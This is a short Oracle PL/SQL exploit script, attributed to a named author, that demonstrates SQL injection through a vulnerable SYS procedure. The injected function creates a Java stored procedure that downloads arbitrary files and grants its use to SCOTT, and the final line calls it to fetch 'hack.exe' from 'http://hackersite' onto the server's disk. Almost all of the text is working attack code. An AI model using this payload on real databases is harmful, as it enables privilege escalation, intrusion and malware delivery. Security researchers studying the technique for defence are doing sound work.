/*
  Advanced SQL Injection in Oracle databases
  Uploading a file with SQL Injection
  SYS.SQLIVULN is a procedure vulnerable to SQL Injection

  By Esteban Martinez Fayo
  secemf@yahoo.com.ar
*/

CREATE OR REPLACE  FUNCTION "SCOTT"."SQLI"  return varchar2
authid current_user as
  pragma autonomous_transaction;
  SqlCommand VARCHAR2(2048);

BEGIN
  SqlCommand := '
CREATE OR REPLACE JAVA SOURCE NAMED "SRC_FILE_UPLOAD" AS
import java.lang.*;
import java.io.*;

public class FileUpload {
  public static void fileUpload(String myFile, String url) throws Exception
  {
    File binaryFile = new File(myFile);
    FileOutputStream outStream = new  FileOutputStream(binaryFile);
    java.net.URL u = new java.net.URL(url);
    java.net.URLConnection uc = u.openConnection();
    InputStream is = (InputStream)uc.getInputStream();
    BufferedReader in = new BufferedReader (new InputStreamReader (is));
    byte buffer[] = new byte[1024];
    int length = -1;
    while ((length = is.read(buffer)) != -1) {
      outStream.write(buffer, 0, length);
      outStream.flush(); }
    is.close(); outStream.close();
  } };';
  execute immediate SqlCommand;

  SqlCommand := '
CREATE OR REPLACE PROCEDURE "PROC_FILEUPLOAD" (p_file varchar2, p_url varchar2)
AS LANGUAGE JAVA
NAME ''FileUpload.fileUpload (java.lang.String, java.lang.String)'';';
  execute immediate SqlCommand;

  execute immediate 'GRANT EXECUTE ON PROC_FILEUPLOAD TO SCOTT';

  commit; -- Must do a commit
  return ''; -- Must return a value
END;
/

SET SERVEROUTPUT ON
/
CALL dbms_java.set_output(1999);
/
-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI()||''');
/

-- Call the procedure created in the SQL Injection
EXEC sys.proc_fileupload ('c:\hack.exe', 'http://hackersite/hack.exe');
